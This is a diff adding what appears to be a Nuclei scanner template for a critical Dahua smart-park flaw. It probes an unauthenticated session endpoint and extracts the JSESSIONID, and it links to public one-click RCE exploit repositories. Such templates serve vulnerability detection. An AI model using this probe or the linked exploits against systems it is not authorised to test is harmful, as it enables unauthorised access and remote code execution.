@@ -1,0 +1,47 @@
+id: dahua-zhihuiyuanqu-UseraddAndFileupload-user_save_action
+
+info:
+  name: dahua-zhihuiyuanqu-UseraddAndFileupload-user_save_action
+  description: 存在任意用户添加+后台文件上传。reference有一键利用。
+  author: dahua-zhihuiyuanqu-UseraddAndFileupload-user_save_action
+  severity: critical
+  reference:
+    - https://github.com/A0WaQ4/Dahua_sso_initsession_upload_rce
+    - https://github.com/SleepingBag945/dahua_rce_exp
+    - https://github.com/0xf4n9x/DaHuaWPMSinitSessionRCE
+    - https://forum.butian.net/share/2775
+
+http:
+  - raw:
+      - |+
+        GET /admin/sso_initSession.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Content-Length: 0
+        Content-Type: multipart/form-data; boundary=----fxwrpqcy
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{inbody}}'
+          
+      - type: word
+        part: header
+        words:
+          - 'pplication/octet-stream'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: inbody
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'JSESSIONID=(.*); Path'
